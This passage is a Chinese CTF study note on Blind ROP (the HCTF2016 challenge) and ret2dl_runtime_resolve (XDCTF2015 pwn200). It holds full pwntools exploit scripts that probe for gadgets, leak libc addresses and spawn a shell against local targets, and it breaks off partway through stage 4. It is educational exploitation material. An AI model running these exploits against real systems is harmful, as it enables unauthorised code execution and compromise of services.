gadgets**\n\n首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162209719.png\" alt=\"image-20210629162209719\" style=\"zoom:67%;\" />\n\n**find a call write**\n\n我们可以通过plt表来获取write的地址。\n\n**control rdx**\n\n需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序\n\npop rdx; ret\n\n这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。\n\n那么接下来的问题，我们就可以分为两项\n\n- 寻找gadgets\n\n- 寻找PLT表\n\n- - write入口\n  - strcmp入口\n\n**寻找gadgets**\n\n首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况\n\n- 程序直接崩溃\n- 程序运行一段时间后崩溃\n- 程序一直运行而并不崩溃\n\n为了寻找合理的gadgets，我们可以分为以下两步\n\n**寻找stop gadgets**\n\n所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。\n\n其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。\n\n之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。例子如下图\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162456711.png\" alt=\"image-20210629162456711\" style=\"zoom:67%;\" />\n\n但是，如果我们布置了stop gadget，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。\n\n**识别 gadgets**\n\n那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址\n\n- **Probe**\n\n- - 探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。\n\n- **Stop**\n\n- - 不会使得程序崩溃的stop      gadget的地址。\n\n- **Trap**\n\n- - 可以导致程序崩溃的地址\n\n我们可以通过在栈上摆放不同顺序的**Stop**与 **Trap**从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子\n\n- probe,stop,traps(traps,traps,...)\n\n- - 我们通过程序崩溃与否(**如果程序在probe处直接崩溃怎么判断**)可以找到不会对栈进行pop操作的gadget，如\n\n  - - ret\n    - xor eax,eax; ret\n\n- probe,trap,stop,traps\n\n- - 我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如\n\n  - - pop rax; ret\n    - pop rdi; ret\n\n- probe, trap, trap,     trap, trap, trap, trap, stop, traps\n\n- - 我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop      gadget相似的gadget。**这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，**这里一般来说会遇到两处比较有意思的地方\n\n  - - plt处不会崩，，\n    - _start处不会崩，相当于程序重新执行。\n\n之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。\n\n但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。\n\n但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。\n\n此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。\n\n需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.\n\n**寻找PLT**\n\n如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162829637.png\" alt=\"image-20210629162829637\" style=\"zoom:67%;\" />\n\n此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。\n\n**控制rdx**\n\n当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。\n\n之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址\n\n- readable，可读的地址。\n- bad,     非法地址，不可访问，比如说0x0。\n\n那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况\n\n- strcmp(bad,bad)\n- strcmp(bad,readable)\n- strcmp(readable,bad)\n- strcmp(readable,readable)\n\n只有最后一种格式，程序才会正常执行。\n\n**注**：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。\n\n那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法\n\n- 利用plt表项的慢路径\n- 并且利用下一个表项的慢路径的地址来覆盖返回地址\n\n这样，我们就不用来回控制相应的变量了。\n\n当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。\n\n**寻找输出函数**\n\n寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。\n\n**寻找write@plt**\n\n当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值\n\n- 使用rop     chain，同时使得每个rop对应的文件描述符不一样\n- 同时打开多个连接，并且我们使用相对较高的数值来试一试。\n\n需要注意的是\n\n- linux默认情况下，一个进程最多只能打开1024个文件描述符。\n- posix标准每次申请的文件描述符数值总是当前最小可用数值。\n\n当然，我们也可以选择寻找puts函数。\n\n**寻找puts@plt**\n\n寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下\n\npayload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n\n此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情\n\n- 将socket输出重定向到输入输出\n- 寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。\n- 执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。\n\n以HCTF2016的出题人失踪了为例\n\n1.确定栈溢出长度。\n\n```python\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 9999)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n```\n\n根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。\n\n2.寻找 stop gadgets。\n\n寻找过程如下：\n\n```python\ndef get_stop_addr(length):\n    addr = 0x400000\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 9999)\n            sh.recvuntil('password?\\n')\n            payload = 'a' * length + p64(addr)\n            sh.sendline(payload)\n            sh.recv()\n            sh.close()\n            print 'one success addr: 0x%x' % (addr)\n            return addr\n        except Exception:\n            addr += 1\n            sh.close()\n```\n\n这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，如果开启了，那就按照开启了的方法做，结果发现了不少，我选择了一个貌似返回到源程序中的地址\n\none success stop gadget addr: 0x4006b6\n\n3.识别brop gadgets。\n\n下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。\n\n```python\ndef get_brop_gadget(length, stop_gadget, addr):\n    try:\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(\n            stop_gadget) + p64(0) * 10\n        sh.sendline(payload)\n        content = sh.recv()\n        sh.close()\n        print content\n        # stop gadget returns memory\n        if not content.startswith('WelCome'):\n            return False\n        return True\n    except Exception:\n        sh.close()\n        return False\ndef check_brop_gadget(length, addr):\n    try:\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'a' * length + p64(addr) + 'a' * 8 * 10\n        sh.sendline(payload)\n        content = sh.recv()\n        sh.close()\n        return False\n    except Exception:\n        sh.close()\n        return True\n##length = getbufferflow_length()\nlength = 72\n##get_stop_addr(length)\nstop_gadget = 0x4006b6\naddr = 0x400740\nwhile 1:\n    print hex(addr)\n    if get_brop_gadget(length, stop_gadget, addr):\n        print 'possible brop gadget: 0x%x' % addr\n        if check_brop_gadget(length, addr):\n            print 'success brop gadget: 0x%x' % addr\n            break\n    addr += 1\n```\n\n这样，我们基本得到了brop的gadgets地址0x4007ba\n\n4.确定puts@plt地址。\n\n根据上面所说，我们可以构造如下payload来进行获取：\n\n```python\npayload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n```\n\n具体函数如下：\n\n```python\ndef get_puts_addr(length, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(\n            addr) + p64(stop_gadget)\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print 'find puts@plt addr: 0x%x' % addr\n                return addr\n            sh.close()\n            addr += 1\n        except Exception:\n            sh.close()\n            addr += 1\n```\n\n最后根据plt的结构，选择0x400560作为puts@plt\n\n5.泄露puts@got地址。\n\n在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下：\n\n```python\ndef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):\n    sh = remote('127.0.0.1', 9999)\n    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(\n        puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.sendline(payload)\n    try:\n        data = sh.recv()\n        sh.close()\n        try:\n            data = data[:data.index(\"\\nWelCome\")]\n        except Exception:\n            data = data\n        if data == \"\":\n            data = '\\x00'\n        return data\n    except Exception:\n        sh.close()\n        return None\n##length = getbufferflow_length()\nlength = 72\n##stop_gadget = get_stop_addr(length)\nstop_gadget = 0x4006b6\n##brop_gadget = find_brop_gadget(length,stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = brop_gadget + 9\n##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)\nputs_plt = 0x400560\naddr = 0x400000\nresult = \"\"\nwhile addr < 0x401000:\n    print hex(addr)\n    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)\n    if data is None:\n        continue\n    else:\n        result += data\n    addr += len(data)\nwith open('code', 'wb') as f:\n    f.write(result)\n\n```\n\n6.最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了'\\x00'，因为puts是输出字符串，字符串是以'\\x00'为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下:\n\n```assembly\nseg000:0000000000400560                 db 0FFh\nseg000:0000000000400561                 db  25h ; %\nseg000:0000000000400562                 db 0B2h ;\nseg000:0000000000400563                 db  0Ah\nseg000:0000000000400564                 db  20h\nseg000:0000000000400565                 db    0\n#然后按下c,将此处的数据转换为汇编指令，如下\nseg000:0000000000400560 ; ---------------------------------------------------------------------------\nseg000:0000000000400560                 jmp     qword ptr cs:601018h\nseg000:0000000000400566 ; ---------------------------------------------------------------------------\nseg000:0000000000400566                 push    0\nseg000:000000000040056B                 jmp     loc_400550\nseg000:000000000040056B ; ---------------------------------------------------------------------------\n\n```\n\n这说明，puts@got的地址为0x601018。\n\n7.程序利用\n\n```python\n##length = getbufferflow_length()\nlength = 72\n##stop_gadget = get_stop_addr(length)\nstop_gadget = 0x4006b6\n##brop_gadget = find_brop_gadget(length,stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = brop_gadget + 9\n##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)\nputs_plt = 0x400560\n##leakfunction(length, rdi_ret, puts_plt, stop_gadget)\nputs_got = 0x601018\nsh = remote('127.0.0.1', 9999)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\n### 高级了！！！不敢想象wow~ ⊙o⊙！！！\n\n**ret2_dl_runtime_resolve**\n\n高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。\n\n要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。\n\n我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下\n\n1. 控制程序执行dl_resolve函数\n\n2. - 给定Link_map以及index两个参数。\n   - 当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。\n\n3. 控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。\n\n4. 伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。\n\n5. 伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。\n\n**此外，这个攻击成功的很必要的条件**\n\n- **dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。**\n- **dl_resolve函数最后的解析根本上依赖于所给定的字符串。**\n\n**注意**：\n\n- 符号版本信息\n\n- - 最好使得ndx = VERSYM[(reloc->r_info) >> 8] 的值为0，以便于防止找不到的情况。\n\n- 重定位表项\n\n- - r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。\n\n**攻击条件**\n\n说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。\n\n**以XDCTF 2015的pwn200为例**\n\n首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main\n```\n\n在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。\n\n\t1. 利用正常的代码来使用该技巧从而获取shell。\n     \\-  stage 1 测试控制程序执行write函数的效果。\n     \\-  stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。\n     \\-  stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。\n\n2. 利用roputils中已经集成好的工具来实现攻击，从而获取shell。\n\n**正常攻击**\n\n显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。\n\n```assembly\ngef➤  pattern create 200\n[+] Generating a pattern of 200 bytes\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n[+] Saved as '$_gef0'\ngef➤  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\nWelcome to XDCTF2015~!\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\nProgram received signal SIGSEGV, Segmentation fault.\n0x62616164 in ?? ()\n─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]──────────────────────────────────────────────────────────\n$eax   : 0x000000c9\n$ebx   : 0x00000000\n$ecx   : 0xffffcc6c  →  \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"\n$edx   : 0x00000100\n$esp   : 0xffffcce0  →  \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\"\n$ebp   : 0x62616163 (\"caab\"?)\n$esi   : 0xf7fac000  →  0x001b1db0\n$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001\n$eip   : 0x62616164 (\"daab\"?)\n$cs    : 0x00000023\n$ss    : 0x0000002b\n$ds    : 0x0000002b\n$es    : 0x0000002b\n$fs    : 0x00000000\n$gs    : 0x00000063\n$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────────────────\n[!] Cannot disassemble from $PC\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────────────────\n['0xffffcce0', 'l8']\n8\n0xffffcce0│+0x00: \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\"  ← $esp\n0xffffcce4│+0x04: \"faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]\"\n0xffffcce8│+0x08: \"gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]\"\n0xffffccec│+0x0c: \"haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]\"\n0xffffccf0│+0x10: \"iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]\"\n0xffffccf4│+0x14: \"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]\"\n0xffffccf8│+0x18: \"kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]\"\n0xffffccfc│+0x1c: \"laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]\"\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────\n────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\ngef➤  pattern search\n[!] Syntax\npattern search PATTERN [SIZE]\ngef➤  pattern search 0x62616164\n[+] Searching '0x62616164'\n[+] Found at offset 112 (little-endian search) likely\n\n```\n\n**stage 1**\n\n这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步\n\n1. 将栈迁移到bss段。\n2. 控制write函数输出相应字符串。\n\n这里主要使用了pwntools中的ROP模块。具体代码如下\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write cmd=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nrop.write(1, base_stage + 80, len(sh))\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n结果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage1.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 120912\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 2**\n\n在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write cmd=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nwrite_index = (elf.plt['write'] - plt0) / 16 - 1\nwrite_index *= 8\nrop.raw(plt0)\nrop.raw(write_index)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n效果如下，仍然输出了cmd对应的字符串。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage2.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 123406\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 3**\n\n这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。\n\n鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ readelf -r main  \n重定位节 '.rel.dyn' 位于偏移量 0x318 含有 3 个条目：\n 偏移量     信息    类型              符号值      符号名称\n08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__\n0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0\n0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0\n重定位节 '.rel.plt' 位于偏移量 0x330 含有 5 个条目：\n 偏移量     信息    类型              符号值      符号名称\n0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0\n0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0\n0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0\n0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0\n```\n\n可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = 0x607\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw(write_got)  # fake reloc\nrop.raw(r_info)\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage3.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 126063\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 4**\n\nstage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607>>8=0x6。因此，我们知道write对应的符号地址为0x8048238。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main\nmain：     文件格式 elf32-i386\nContents of section .dynsym:\n 80481d8 00000000 00000000 00000000 00000000  ................\n 80481e8 33000000 00000000 00000000 12000000  3...............\n 80481f8 27000000 00000000 00000000 12000000  '...............\n 8048208 52000000 00000000 00000000 20000000  R........... ...\n 8048218 20000000 00000000 00000000 12000000   ...............\n 8048228 3a000000 00000000 00000000 12000000  :...............\n 8048238 4c000000 00000000 00000000 12000000  L...............\n 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........\n 8048258 0b000000 3c860408 04000000 11001000  ....<...........\n 8048268 1a000000 40a00408 04000000 11001a00  ....@...........\n```\n\n这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n### making fake write symbol\nfake_sym_addr = base_stage + 32\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf\n                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10\nfake_sym_addr = fake_sym_addr + 